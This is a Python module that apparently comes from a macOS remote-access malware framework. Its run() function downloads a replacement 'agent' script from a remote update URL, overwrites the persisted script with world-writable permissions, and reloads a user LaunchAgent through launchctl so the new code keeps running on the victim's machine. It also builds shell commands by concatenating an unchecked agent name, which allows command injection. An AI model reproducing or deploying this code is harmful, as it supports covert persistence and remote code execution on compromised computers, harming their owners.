# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import os
import shutil
import subprocess
from os import path

try:
    from urllib.request import urlopen, Request, HTTPError
except ImportError:
    from urllib2 import urlopen, Request, HTTPError


BACKUP_FILENAME_SUFFIX = ".bak"
SUPPORTED_EXTENSIONS = (".sh", ".bat", ".ps1", ".rb")


def run_command(command):
    """Runs a system command and returns its output."""
    try:
        out, err = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True
        ).communicate()
        if isinstance(out, bytes):
            out = out.decode("utf-8", errors="replace")
        return (out or "").strip()
    except Exception as ex:
        return str(ex)


def looks_like_script(data, extension):
    """Validates the downloaded script by extension.

    :type data: bytes
    :type extension: str
    :rtype: bool
    """
    if not data:
        return False
    probe = data[:256].decode("utf-8", errors="ignore").lstrip()
    if extension == ".sh":
        return probe.startswith("#!") or "#!/bin" in probe[:128]
    if extension == ".rb":
        return bool(probe)
    if extension == ".ps1":
        return bool(probe)
    if extension == ".bat":
        return bool(probe)
    return bool(probe)


def run(options):
    """Swaps the persisted script with a freshly downloaded one.

    :type options: dict
    """
    response_options = options.get("response_options", {}) or {}
    update_url = response_options.get("update_url", "")
    program_directory = options.get("program_directory", "")
    loader_options = options.get("loader_options", {}) or {}

    if not update_url:
        print("Error: no update_url provided, cannot update.")
        return

    script_filename = loader_options.get("script_filename") or "agent.sh"
    launch_agent_name = loader_options.get("launch_agent_name", "")
    extension = os.path.splitext(script_filename)[1].lower()

    if extension not in SUPPORTED_EXTENSIONS:
        print("Error: unsupported script extension: " + extension)
        return

    script_file = path.join(program_directory, script_filename)
    backup_file = script_file + BACKUP_FILENAME_SUFFIX

    if not os.path.isfile(script_file):
        print("Error: current script not found at " + script_file)
        return

    print("Downloading update from " + update_url)
    try:
        response_handle = urlopen(Request(update_url), timeout=30)
        new_script = response_handle.read()
        response_handle.close()
    except HTTPError as ex:
        print("Error: failed to download update (HTTP " + str(ex.code) + ").")
        return
    except Exception as ex:
        print("Error: failed to download update: " + str(ex))
        return

    if not looks_like_script(new_script, extension):
        print("Error: downloaded script is empty or invalid, aborting.")
        return

    temp_file = script_file + ".new"
    try:
        with open(temp_file, "wb") as output_file:
            output_file.write(new_script)
        os.chmod(temp_file, 0o777)
        os.rename(temp_file, script_file)
        shutil.copyfile(script_file, backup_file)
    except Exception as ex:
        print("Error: failed to write updated script: " + str(ex))
        try:
            if os.path.exists(temp_file):
                os.remove(temp_file)
        except OSError:
            pass
        return

    launch_agent_file = path.join(
        path.expanduser("~/Library/LaunchAgents"), launch_agent_name + ".plist"
    )

    if launch_agent_name and os.path.isfile(launch_agent_file):
        run_command("launchctl unload -w " + launch_agent_file)
        run_command("launchctl bootout gui/$(id -u)/" + launch_agent_name)
        run_command("launchctl load -w " + launch_agent_file)
        if run_command("launchctl list | grep -w " + launch_agent_name):
            print("Updated successfully, script launch agent reloaded.")
        else:
            print("Script replaced but launch agent not listed yet.")
    else:
        print("Updated successfully, script replaced.")
